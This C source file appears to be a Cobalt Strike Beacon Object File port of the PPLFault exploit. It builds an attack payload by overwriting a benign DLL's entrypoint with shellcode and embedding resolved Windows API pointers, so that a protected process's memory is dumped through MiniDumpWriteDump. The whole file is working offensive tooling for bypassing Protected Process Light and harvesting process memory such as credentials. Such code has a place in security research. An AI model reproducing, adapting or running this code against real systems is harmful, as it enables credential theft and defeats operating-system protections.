// PPLFault by Gabriel Landau
// https://twitter.com/GabrielLandau

#define _CRT_SECURE_NO_WARNINGS
#include "beacon.h"
#include "Payload.h"
#include <stdint.h>
#include "DumpShellcode.h"
#include "PayloadUtils.h"
#include <stdio.h>
#include <DbgHelp.h>
#include "bofdefs.h"

// Builds a SHELLCODE_PARAMS struct so our payload can be smaller and simpler
BOOL InitShellcodeParams(
    PSHELLCODE_PARAMS pParams,
    DWORD dwTargetProcessId,
    PCWCHAR pDumpPath
)
{
    HMODULE hKernel32 = KERNEL32$GetModuleHandleW(L"kernel32.dll");
    HMODULE hNtdll = KERNEL32$GetModuleHandleW(L"ntdll.dll");

    if ((NULL == hKernel32) || (NULL == hNtdll))
    {
        BeaconPrintf(CALLBACK_ERROR, "Couldn't find kernel32/ntdll?  What?");
        return FALSE;
    }

    pParams->magic1 = MAGIC1;
    pParams->magic2 = MAGIC2;

    // User params
    pParams->dwTargetProcessId = dwTargetProcessId;
    if (MSVCRT$wcslen(pDumpPath) >= _countof(pParams->dumpPath))
    {
        BeaconPrintf(CALLBACK_ERROR, "Dump path too long: %ws", pDumpPath);
        return FALSE;
    }
    MSVCRT$wcsncpy(pParams->dumpPath, pDumpPath, _countof(pParams->dumpPath));

    // Strings (so we don't have to embed them in shellcode)
    MSVCRT$strncpy(pParams->szMiniDumpWriteDump, "MiniDumpWriteDump", _countof(pParams->szMiniDumpWriteDump));
    MSVCRT$wcsncpy(pParams->szDbgHelpDll, L"Dbghelp.dll", _countof(pParams->szDbgHelpDll));

    // IAT
    // Target process should already have kernel32 loaded, so we can just pass pointers over
    pParams->pLoadLibraryW = (LoadLibraryW_t)KERNEL32$GetProcAddress(hKernel32, "LoadLibraryW");
    pParams->pGetProcAddress = (GetProcAddress_t)KERNEL32$GetProcAddress(hKernel32, "GetProcAddress");
    pParams->pOpenProcess = (OpenProcess_t)KERNEL32$GetProcAddress(hKernel32, "OpenProcess");
    pParams->pCreateFileW = (CreateFileW_t)KERNEL32$GetProcAddress(hKernel32, "CreateFileW");
    pParams->pTerminateProcess = (TerminateProcess_t)KERNEL32$GetProcAddress(hKernel32, "TerminateProcess");
    pParams->pRtlAdjustPrivilege = (RtlAdjustPrivilege_t)KERNEL32$GetProcAddress(hNtdll, "RtlAdjustPrivilege");    

    if (!pParams->pLoadLibraryW || 
        !pParams->pGetProcAddress || 
        !pParams->pOpenProcess || 
        !pParams->pCreateFileW || 
        !pParams->pTerminateProcess ||
        !pParams->pRtlAdjustPrivilege)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resolve a payload import");
        return FALSE;
    }

    return TRUE;
}

// Build a payload that consists of the given benign DLL with its entrypoint overwritten by our shellcode
BOOL BuildPayload(
    HANDLE hBenignDll, 
    char ** payloadBuffer,
    DWORD dwTargetProcessId,
    PCWCHAR pDumpPath,
    DWORD* len,
    uint8_t* shellcode,
    DWORD shellcodelen)
{
    void *buf;
    LARGE_INTEGER dllSize;
    DWORD dwBytesRead = 0;
    PVOID pEntrypoint = NULL;
    DWORD bytesWritten = 0;
    SHELLCODE_PARAMS params = { 0, };
    SIZE_T availableSpace = 0;

    // Read entire source file into buffer
    KERNEL32$SetFilePointer(hBenignDll, 0, NULL, SEEK_SET);
    KERNEL32$GetFileSizeEx(hBenignDll, &dllSize);
    buf = intAlloc(dllSize.QuadPart); //This leaks, cost of quick convert

    if (!KERNEL32$ReadFile(hBenignDll, buf, dllSize.LowPart, &dwBytesRead, NULL) || 
        (dwBytesRead != dllSize.QuadPart))
    {
        BeaconPrintf(CALLBACK_ERROR, "BuildPayload: ReadFile failed with GLE %u", KERNEL32$GetLastError());
        return FALSE;
    }

    // Find the entrypoint
    pEntrypoint = FindEntrypointVA(buf);
    if (!pEntrypoint)
    {
        return FALSE;
    }

    availableSpace = ((uint8_t*)buf) +  dllSize.QuadPart - (char*)pEntrypoint;

    // Overwrite entrypoint with shellcode embedded in our resource section
    if (!WriteShellcode( pEntrypoint, shellcode, shellcodelen, &bytesWritten))
    {
        return FALSE;
    }

    // Create a SHELLCODE_PARAMS and write it after the shellcode
    if (!InitShellcodeParams(&params, dwTargetProcessId, pDumpPath))
    {
        return FALSE;
    }

    if (((uint8_t*)buf) + dllSize.QuadPart - 1 - (char*)pEntrypoint + bytesWritten < sizeof(params))
    {
        BeaconPrintf(CALLBACK_ERROR, "Not enough space for SHELLCODE_PARAMS");
        return FALSE;
    }

    // Install SHELLCODE_PARAMS
    MSVCRT$memcpy(((PUCHAR)pEntrypoint) + bytesWritten, &params, sizeof(params));

    *payloadBuffer = buf;
    *len = (DWORD)dllSize.QuadPart;

    return TRUE;
}
